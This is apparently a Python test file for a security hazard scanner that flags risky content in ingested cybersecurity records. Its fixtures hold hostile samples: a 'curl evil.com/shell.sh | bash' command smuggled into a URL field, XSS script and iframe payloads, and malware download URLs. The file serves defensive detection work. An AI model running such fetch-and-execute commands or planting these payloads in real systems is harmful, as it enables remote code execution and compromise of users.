"""Tests for the security hazard scanner."""

from __future__ import annotations

from cybersec_slm.ingestion.hazard_scan import scan_record, scan_source_sample


def test_detects_script_tag():
    rec = {"text": "Payload found: <script>alert('xss')</script> in the target"}
    hazards = scan_record(rec)
    types = {h["type"] for h in hazards}
    assert "embedded_active_content" in types


def test_detects_javascript_uri():
    rec = {"text": "Link was javascript: void(0) which redirected to malware"}
    hazards = scan_record(rec)
    types = {h["type"] for h in hazards}
    assert "javascript_uri" in types


def test_detects_long_base64():
    payload = "A" * 600  # 600-char base64-like string
    rec = {"text": f"Encoded payload was: {payload}"}
    hazards = scan_record(rec)
    types = {h["type"] for h in hazards}
    assert "base64_payload" in types


def test_detects_shell_injection_in_structured_field():
    rec = {"url": "http://example.com/; curl http://evil.com/shell.sh | bash",
           "text": "normal text"}
    hazards = scan_record(rec)
    types = {h["type"] for h in hazards}
    assert "shell_injection" in types


def test_does_not_flag_shell_in_text_field():
    """Shell patterns in prose text fields are normal for a cybersecurity corpus."""
    rec = {"text": "The attacker used ; curl http://evil.com/shell.sh | bash"}
    hazards = scan_record(rec)
    # Shell injection should NOT be flagged for non-structured fields
    shell_hazards = [h for h in hazards if h["type"] == "shell_injection"]
    assert len(shell_hazards) == 0


def test_detects_suspicious_url():
    rec = {"text": "Download from http://192.168.1.100/payload.exe was blocked"}
    hazards = scan_record(rec)
    types = {h["type"] for h in hazards}
    assert "suspicious_url" in types


def test_clean_record_no_hazards():
    rec = {"text": "This is a clean cybersecurity report about incident response procedures."}
    hazards = scan_record(rec)
    assert len(hazards) == 0


def test_skips_private_fields():
    rec = {"_internal": "<script>alert('xss')</script>", "text": "clean text"}
    hazards = scan_record(rec)
    # Private fields (starting with _) are skipped
    assert all(h["field"] != "_internal" for h in hazards)


def test_scan_source_sample_limits():
    records = [{"text": f"Record {i} with <script>x</script>"} for i in range(300)]
    hazards = scan_source_sample(records, max_records=50)
    # Should only scan first 50 records
    indices = {h["record_index"] for h in hazards}
    assert max(indices) < 50


def test_iframe_detection():
    rec = {"text": "Injected <iframe src='http://evil.com/phish'></iframe> into page"}
    hazards = scan_record(rec)
    types = {h["type"] for h in hazards}
    assert "embedded_active_content" in types


def test_suspicious_tld():
    rec = {"text": "Malware was hosted at http://downloads.evil.xyz/trojan.exe"}
    hazards = scan_record(rec)
    types = {h["type"] for h in hazards}
    assert "suspicious_url" in types
